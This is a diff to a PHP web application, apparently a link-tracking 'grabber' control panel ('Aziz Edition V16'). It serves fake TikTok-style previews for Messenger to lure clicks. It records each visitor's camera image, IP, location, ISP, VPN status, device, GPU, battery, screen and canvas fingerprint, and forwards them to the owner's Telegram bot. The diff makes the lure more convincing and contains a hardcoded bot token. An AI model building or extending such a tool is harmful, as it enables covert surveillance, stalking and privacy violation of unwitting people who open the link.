@@ -3,14 +3,13 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 
-// السماح للسيرفر بإكمال العمل في الخلفية حتى لو أغلق المستخدم الصفحة
 ignore_user_abort(true);
 set_time_limit(0);
 
 session_start();
 
 // ==============================================================================
-// 🖼️ مولد الصور الذكي (يجعل المعاينة مربعة وتناسب ماسنجر)
+// 🖼️ مولد الصور الذكي (يجعل المعاينة مربعة وكبيرة وتناسب ماسنجر)
 // ==============================================================================
 if (isset($_GET['gen_img'])) {
     $img_url = base64_decode($_GET['gen_img']);
@@ -19,13 +18,14 @@ if (isset($_GET['gen_img'])) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
     $image_data = curl_exec($ch);
     curl_close($ch);
 
     if ($image_data) {
         if (function_exists('imagecreatefromstring')) {
-            $src = imagecreatefromstring($image_data);
+            $src = @imagecreatefromstring($image_data);
             if ($src) {
                 $w = imagesx($src); $h = imagesy($src); $target_size = 800;
                 $dst = imagecreatetruecolor($target_size, $target_size);
@@ -34,8 +34,8 @@ if (isset($_GET['gen_img'])) {
                 $new_w = $w * $scale; $new_h = $h * $scale;
                 $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
                 imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
-                for ($i = 0; $i < 15; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
-                imagefilter($bg, IMG_FILTER_BRIGHTNESS, -50);
+                for ($i = 0; $i < 20; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
+                imagefilter($bg, IMG_FILTER_BRIGHTNESS, -60);
                 $scale_center = $target_size / $h; $new_w_center = $w * $scale_center; $new_h_center = $target_size;
                 $x_center = ($target_size - $new_w_center) / 2; $y_center = 0;
                 imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
@@ -48,6 +48,7 @@ if (isset($_GET['gen_img'])) {
         }
         header('Content-Type: image/jpeg'); echo $image_data; exit;
     }
+    // صورة بديلة فقط في حال فشل كل شيء
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"); exit;
 }
 
@@ -102,11 +103,8 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     if (empty($chat_id)) return;
     $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
     
-    // إذا كانت هناك صورة، نستخدم sendPhoto لإرسالها مع التعليق
     if (!empty($image_base64) && strpos($image_base64, 'data:image/') === 0) {
         $url = "https://api.telegram.org/bot{$token}/sendPhoto";
-        
-        // تحويل Base64 إلى ملف مؤقت
         $image_parts = explode(";base64,", $image_base64);
         $image_base64_data = base64_decode($image_parts[1] ?? '');
         $tmpfile = tempnam(sys_get_temp_dir(), 'tg_img_') . '.jpg';
@@ -128,9 +126,8 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         curl_exec($ch);
         curl_close($ch);
 
-        @unlink($tmpfile); // حذف الملف المؤقت
+        @unlink($tmpfile);
     } else {
-        // إرسال نص فقط
         $url = "https://api.telegram.org/bot{$token}/sendMessage";
         $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
         $ch = curl_init();
@@ -144,10 +141,17 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
+// دالة محسنة جداً لجلب بيانات تيك توك الحقيقية
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
+    
+    // المحاولة 1: عبر oEmbed API
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4, CURLOPT_CONNECTTIMEOUT => 2, CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)']);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
+        CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    ]);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
@@ -155,6 +159,30 @@ function fetch_tiktok_exclusive_meta($url) {
             return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
         }
     }
+    
+    // المحاولة 2: استخراج مباشر من الصفحة
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
+        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
+    ]);
+    $html = curl_exec($ch); curl_close($ch);
+    
+    if ($html) {
+        // استخراج العنوان
+        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
+            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        } elseif (preg_match('/<title>(.*?)<\/title>/', $html, $matches)) {
+            $meta['title'] = html_entity_decode(trim($matches[1]), ENT_QUOTES, 'UTF-8');
+        }
+        
+        // استخراج الصورة (مهم جداً)
+        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
+            $meta['image'] = $matches[1];
+        }
+    }
+    
     return $meta;
 }
 
@@ -166,7 +194,6 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// تحسين التعرف على المتعاملين
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -180,7 +207,6 @@ function get_ip_details($ip) {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $isp = $data['isp'] ?? 'Unknown ISP';
             
-            // مطابقة دقيقة لمزودي الخدمة في الجزائر
             if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy 🇩🇿';
             elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis 🇩🇿';
             elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo 🇩🇿';
@@ -236,6 +262,7 @@ if (isset($_GET['r'])) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="800"><meta property="og:image:height" content="800">';
@@ -274,7 +301,6 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
-                // تغيير "اسم الرابط" إلى "اسم الحساب"
                 $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
                 $msg .= "🔗 <b>اسم الحساب:</b> {$link['name']}\n";
                 $msg .= "📱 <b>الموديل:</b> {$device}\n";
@@ -286,7 +312,6 @@ if (isset($_GET['r'])) {
                 $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
                 $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
                 
-                // إرسال التقرير مع الصورة
                 sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
             exit;
@@ -477,16 +502,17 @@ if ($is_logged_in) {
         :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: rgba(15, 21, 35, 0.9); }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
-        /* 🌟 الأنيميشن الجديد: تدرج لوني ناعم بين الأسود الداكن والأخضر */
-        @keyframes smoothPulse {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        /* 🌟 أنيميشن "العقرب" - تغيير الألوان بسلاسة */
+        @keyframes scorpionColors {
+            0% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
+            33% { background: linear-gradient(135deg, #05080f 0%, #064e3b 50%, #05080f 100%); }
+            66% { background: linear-gradient(135deg, #05080f 0%, #4c1d95 50%, #05080f 100%); }
+            100% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
         }
+        
         body { 
-            background: linear-gradient(135deg, #05080f 0%, #0d1712 50%, #05080f 100%);
+            animation: scorpionColors 12s ease-in-out infinite;
             background-size: 200% 200%;
-            animation: smoothPulse 10s ease-in-out infinite;
             color: var(--text); 
             min-height: 100vh; 
             display: flex; 
@@ -625,7 +651,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V15</p>
+                <p>Aziz Edition V16</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
